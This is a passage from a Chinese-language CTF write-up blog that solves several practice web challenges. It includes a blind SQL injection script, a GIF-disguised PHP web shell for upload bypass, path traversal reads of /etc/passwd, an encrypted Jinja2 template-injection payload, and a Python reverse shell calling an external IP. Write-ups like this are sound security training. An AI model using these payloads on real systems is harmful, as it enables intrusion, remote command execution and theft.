class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进/open/，进去open_sesame.js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">1</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    open(i + <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">4000000000</span>) <span class="built_in">window</span>.location = <span class="string">&quot;/fight/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进/fight/，进去fight.js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就给出了flag，但是是乱序的，写脚本排下序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line">item = permutations(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    j = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line">    <span class="comment"># print(j)</span></span><br><span class="line">    <span class="keyword">if</span> j.startswith(<span class="string">&quot;pctf&#123;hey_boys&quot;</span>) <span class="keyword">and</span> j[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        print(j)</span><br></pre></td></tr></table></figure><p>顺序正常的那个就是flag。</p><blockquote><p>pctf{hey_boys_im_baaaaaaaaaack!}</p></blockquote><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><h3 id="regexp注入"><a href="#regexp注入" class="headerlink" title="regexp注入"></a>regexp注入</h3><p>有robots.txt，进去可以拿到hint.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|&#x27;|=| |in|&lt;|&gt;|-|.|()|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure><p>这里直接就给出了过滤的内容，ban了挺多东西的，但是只要有password就可以拿到flag，而且regexp放出来了，尝试regexp注入。</p><p>写盲注脚本前先跑一下正确的显示，方便写脚本。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724153506270.png"></p><p>然后是写脚本时间！虽然空格没了，但是可以用/**/注释符代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7c2e6748-2f52-4cd7-bf7e-353a4bab5b98.node4.buuoj.cn/&quot;</span></span><br><span class="line">reg = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span> + <span class="string">&quot;_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> reg:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">f&#x27;||/**/passwd/**/regexp/**/&quot;^<span class="subst">&#123;flag + mid&#125;</span>&quot;;<span class="subst">&#123;parse.unquote(<span class="string">&quot;%00&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome.php&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += mid</span><br><span class="line">            print(<span class="string">f&quot;[+]Flag new is: <span class="subst">&#123;flag.lower()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以跑出password</p><blockquote><p>you_will_never_know7788990</p></blockquote><p>然后直接登陆就行了。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724154414300.png"></p><p>拿到flag</p><blockquote><p>flag{0c36d354-c693-4611-9c3b-ff418512f386}</p></blockquote><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>签到题估计是ヾ(´･･｀｡)ノ。</p><h3 id="cookie伪造-1"><a href="#cookie伪造-1" class="headerlink" title="cookie伪造"></a>cookie伪造</h3><p>直接拿cookie去base64解码，然后把money改到100以上，直接买曲奇就能拿到flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724155849917.png"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>简单的文件上传，虽然有exif_imagetype()挡着，但是可以在文件头前加东西绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接登陆传上去就有shell了，地址可以在上传后的头像上看到。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724164557410.png"></p><p>然后进去拿flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724164620663.png"></p><p>就可以拿到flag了</p><blockquote><p>flag{c3944c3a-0d58-4fb3-bb2c-6c8b89290cc3}</p></blockquote><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><h3 id="简单SSTI"><a href="#简单SSTI" class="headerlink" title="简单SSTI"></a>简单SSTI</h3><p>题目很明显的给出了是flask，用arjun爆一下参数。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111657215.png"></p><p>可以知道注入点是name，简单测试一下。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111755954.png"></p><p>很明显是jinjia2模板，直接拿权。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111859942.png"></p><p>拿flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111923648.png"></p><blockquote><p>flag{d4f17600-d22b-4bc9-95d4-eda38ea5df04}</p></blockquote><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>题目给了个url参数，试了试发现可以目录穿越读东西，直接看/etc/passwd/</p><blockquote><p>?url=../../../../etc/passwd</p></blockquote><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">app:x:1000:1000::&#x2F;home&#x2F;app:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>没什么东西，看一下/proc/self/cmdline，<a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">/proc/self原理在这里</a>。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 app.py </span><br></pre></td></tr></table></figure><p>说明有app.py存在，直接拿。</p><blockquote><p>?url=app.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>可以看到给shell了，但是没有回显，而且key的secret.txt被删掉了，然后这里可以看/proc/self/fd/$pid，这个原理也在上面。</p><p>然后爆破一下secret.txt的$pid，我这边爆出来是3。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725154830215.png"></p><p>这下key就有了，然后就是拿shell了，因为没有回显，所以我选择反弹shell，python里面的嘛，就用python弹，<a href="https://blog.csdn.net/weixin_39890543/article/details/112989316">原理看这里</a>。</p><p>tips: 重开过一次靶机，所以key不一样，记得要url编码(对了，如果是拿自己的服务器反弹shell的话，要记得开放端口。</p><blockquote><p>?key=AuSDLlY07BCOCurV2ZQerfSDZ1ExvuICcJgh0ewklTw%3D&amp;shell=python3%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22116%2E62%2E243%2E231%22%2C1234%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725155859971.png"></p><p>拿到flag。</p><blockquote><p>flag{61c36378-9daa-4176-94bf-1e1006d05c4b}</p></blockquote><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>有点像密码题(x</p><p>题目刚进来给了句<code>Welcome To Find Secret</code>，然后我就好奇心使然(只能说好奇一点点，不能再多了，去看了看/secret。</p><p>结果有一句<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>，明示了嗷，填个secret参数看看。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726102853857.png"></p><p>不对头，很明显被加密了，随便填点东西。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726103051321.png"></p><p>发现直接报错了，而且给了源码，那就好说话了，secret先是会被RC4解密，然后再经过<code>render_template_string</code>模板渲染，那这就是很明显的模板注入了，但是要先RC4加密才能正确输入payload。</p><p>可以网上随便找个脚本进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key=<span class="string">&quot;init_key&quot;</span>, message=<span class="string">&quot;init_message&quot;</span></span>):</span>  <span class="comment"># 返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span></span><br><span class="line">message = <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">enc_base64 = rc4_main(key, message)</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)</span><br><span class="line"><span class="comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure><p>模板注入没ban啥东西，直接拿flag就是了。</p><blockquote><p>flag{3bc3cf51-2658-4f98-93dc-a206fcb3048e}</p></blockquote><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>只能说这题，重头戏之重中之重。</p><p>进入题目之后可以在页面源代码中看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Here is the real page =w= --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>GFXEIM3YFZYGQ4A=</code>进行base64解码后可以得到一个<code>1nD3x.php</code>，进入后直接给出了源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good 